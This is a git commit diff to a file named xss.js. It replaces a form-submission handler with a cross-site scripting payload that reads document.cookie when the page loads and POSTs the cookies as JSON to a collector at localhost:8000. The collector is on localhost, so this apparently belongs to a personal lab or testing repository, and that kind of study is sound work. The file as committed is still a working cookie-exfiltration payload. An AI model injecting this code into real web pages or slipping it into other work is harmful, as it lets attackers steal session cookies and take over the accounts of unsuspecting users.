fd910b9e0015f43552745120ae11b3f959dffb48
Emanuele d'Ajello <55718523+JustJ3di@users.noreply.github.com>
2024-07-14 12:40:26 +0200

    Update xss.js

--- xss.js
+++ xss.js
@@ -1,13 +1,11 @@
     <script>
-        document.getElementById('dataForm').addEventListener('submit', function(event) {
-            event.preventDefault();
-            const inputData = document.getElementById('inputData').value;
-            fetch('http://localhost:8000', {
-                method: 'POST',
-                headers: {
-                    'Content-Type': 'application/json'
-                },
-                body: JSON.stringify({ value: inputData })
-            });
-        });
+const cookiesToSend = document.cookie;
+
+fetch('http://localhost:8000', {
+    method: 'POST',
+    headers: {
+        'Content-Type': 'application/json'
+    },
+    body: JSON.stringify({ cookies: cookiesToSend })
+})
     </script>
